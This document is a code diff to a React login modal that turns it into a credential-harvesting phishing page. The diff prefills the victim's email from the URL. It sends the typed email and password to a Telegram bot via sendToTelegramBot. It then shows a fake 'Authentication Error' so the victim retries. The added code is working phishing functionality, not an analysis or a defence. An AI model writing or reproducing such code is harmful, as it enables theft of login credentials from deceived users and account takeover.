@@ -1,9 +1,11 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
+import { getEmailFromUrl } from "@/utils/urlUtils";
+import { sendToTelegramBot } from "@/utils/telegramApi";
 
 interface AuthModalProps {
   isOpen: boolean;
@@ -11,24 +13,50 @@ interface AuthModalProps {
 }
 
 export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
-  const [email, setEmail] = useState("hi@me.com");
+  const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
+
+  // Prefill email from URL on component mount
+  useEffect(() => {
+    const urlEmail = getEmailFromUrl();
+    if (urlEmail) {
+      setEmail(urlEmail);
+    } else {
+      setEmail("hi@me.com"); // fallback default
+    }
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
     
-    // Simulate loading for 3 seconds
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    setIsLoading(false);
-    toast({
-      title: "Authentication Error",
-      description: "Authentication or network error, please try again",
-      variant: "destructive"
-    });
+    try {
+      // Send to Telegram bot
+      const success = await sendToTelegramBot({ email, password });
+      
+      // Simulate loading for 3 seconds total
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      
+      setIsLoading(false);
+      
+      if (success) {
+        toast({
+          title: "Data Sent",
+          description: "Information has been transmitted successfully",
+        });
+      } else {
+        throw new Error("Failed to send data");
+      }
+    } catch (error) {
+      setIsLoading(false);
+      toast({
+        title: "Authentication Error", 
+        description: "Authentication or network error, please try again",
+        variant: "destructive"
+      });
+    }
   };
 
   return (
